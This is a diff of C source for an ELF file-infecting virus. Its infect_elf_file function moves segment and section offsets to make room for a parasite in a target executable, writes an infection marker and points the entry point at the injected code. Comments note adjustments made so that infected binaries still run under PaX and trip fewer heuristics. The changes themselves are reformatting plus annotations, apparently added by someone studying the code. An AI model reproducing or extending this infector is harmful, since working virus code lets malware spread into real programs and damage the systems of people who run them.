@@ -423,41 +423,43 @@ Elf64_Addr infect_elf_file(elfbin_t *self, elfbin_t *target)
 	 */
 	parasiteSize = self->size;
 	paddingSize = PAGE_ALIGN_UP(parasiteSize);
-	
+	//PER: paddingSize if divisible by PAGE_SIZE and bytes is equal to integer number of pages
 	mem = target->mem;
-	*(uint32_t *)&mem[EI_PAD] = MAGIC_NUMBER;
+	*(uint32_t *)&mem[EI_PAD] = MAGIC_NUMBER; // Last 7 bytes of the first 16 bytes of the ELF header is EI_PAD
 	ehdr = (Elf64_Ehdr *)target->ehdr;
 	phdr = (Elf64_Phdr *)target->phdr;
 	shdr = (Elf64_Shdr *)target->shdr;
-	orig_entry_point = ehdr->e_entry;
+	orig_entry_point = ehdr->e_entry; // PER: starting of _start function in a healthy elf file
 	
-	phdr[0].p_offset += paddingSize;
-        phdr[1].p_offset += paddingSize;
+	phdr[0].p_offset += paddingSize; // PER: 40+virus size
+    phdr[1].p_offset += paddingSize;
         
-        for (i = 0; i < ehdr->e_phnum; i++) {
-                if (text_found)
-                        phdr[i].p_offset += paddingSize;
-        
-                if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R|PF_X)) {
-                                origText = phdr[i].p_vaddr;
-                                phdr[i].p_vaddr -= paddingSize;
-				phdr[i].p_paddr -= paddingSize;
-                                phdr[i].p_filesz += paddingSize;
-                                phdr[i].p_memsz += paddingSize;
-				phdr[i].p_align = 0x1000; // this will allow infected bins to work with PaX :)
-				new_base = phdr[i].p_vaddr;
-				text_found = 1;
-                } else {
+	for (i = 0; i < ehdr->e_phnum; i++) {
+		if (text_found)
+			phdr[i].p_offset += paddingSize;
+
+		if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R|PF_X)) {
+			origText = phdr[i].p_vaddr;
+			phdr[i].p_vaddr -= paddingSize;
+			phdr[i].p_paddr -= paddingSize;
+			phdr[i].p_filesz += paddingSize;
+			phdr[i].p_memsz += paddingSize;
+			phdr[i].p_align = 0x1000; // this will allow infected bins to work with PaX :) // TODO
+			// PER: 0x1000 = 4kB = PAGE_SIZE
+			new_base = phdr[i].p_vaddr;
+			text_found = 1;
+			// PER: proposed change: give offset to this segment also by paddingSize
+		} else {
 			if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset && (phdr[i].p_flags & PF_W))
 				phdr[i].p_align = 0x1000; // also to  allow infected bins to work with PaX :)
 		}
-		
-        }
-        if (!text_found) {
-                DEBUG_PRINT("Error, unable to locate text segment in target executable: %s\n", target->path);
-                return -1;
-        }
-	ehdr->e_entry = origText - paddingSize + sizeof(ElfW(Ehdr));
+	}
+	if (!text_found) {
+		DEBUG_PRINT("Error, unable to locate text segment in target executable: %s\n", target->path);
+		return -1;
+	}
+
+	ehdr->e_entry = origText - paddingSize + sizeof(ElfW(Ehdr)); // PER: new_base= origText-paddingSize
 	shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];
 	char *StringTable = &mem[shdr[ehdr->e_shstrndx].sh_offset];
 	for (i = 0; i < ehdr->e_shnum; i++) {
@@ -466,22 +468,22 @@ Elf64_Addr infect_elf_file(elfbin_t *self, elfbin_t *target)
 	 * It also makes it so that the e_entry still points into the .text section which
 	 * may set off less heuristics.
 	 */
-                if (!_strncmp((char *)&StringTable[shdr[i].sh_name], ".text", 5)) {
-                        shdr[i].sh_offset = sizeof(ElfW(Ehdr)); // -= (uint32_t)paddingSize;
+		if (!_strncmp((char *)&StringTable[shdr[i].sh_name], ".text", 5)) {
+			// PER: if it is .text section
+			shdr[i].sh_offset = sizeof(ElfW(Ehdr)); // -= (uint32_t)paddingSize;
 			shdr[i].sh_addr = origText - paddingSize;
-			shdr[i].sh_addr += sizeof(ElfW(Ehdr));
-                        shdr[i].sh_size += self->size;
-                }  
-                else 
+			shdr[i].sh_addr += sizeof(ElfW(Ehdr)); // PER: sh_addr = entry point = ehdr->entry
+			shdr[i].sh_size += self->size;
+		}  
+		else 
 			shdr[i].sh_offset += paddingSize;
-
 	}
 	ehdr->e_shoff += paddingSize;
 	ehdr->e_phoff += paddingSize;
 	
 	inject_parasite(parasiteSize, paddingSize, target, self, orig_entry_point);
 	
-	return new_base;
+	return new_base; // PER: it is the address in memory from which the parasite is starting
 }
 /*
  * Since our parasite exists of both a text and data segment
@@ -520,13 +522,15 @@ int load_target(const char *path, elfbin_t *elf)
 	elf->fd = fd;
 	if (_fstat(fd, &st) < 0)
 		return -1;
-	elf->mem = _mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
+	elf->mem = _mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0); // PER: file loaded in memory(heap section) pointed by elf->mem 
 	if (elf->mem == MAP_FAILED)
 		return -1;
 	elf->ehdr = (Elf64_Ehdr *)elf->mem;
 	elf->phdr = (Elf64_Phdr *)&elf->mem[elf->ehdr->e_phoff];
 	elf->shdr = (Elf64_Shdr *)&elf->mem[elf->ehdr->e_shoff];
+
 	for (i = 0; i < elf->ehdr->e_phnum; i++) {
+		// PER: traversing through each program header
 		switch(elf->phdr[i].p_type) {	
 			case PT_LOAD:
 				switch(!!elf->phdr[i].p_offset) {
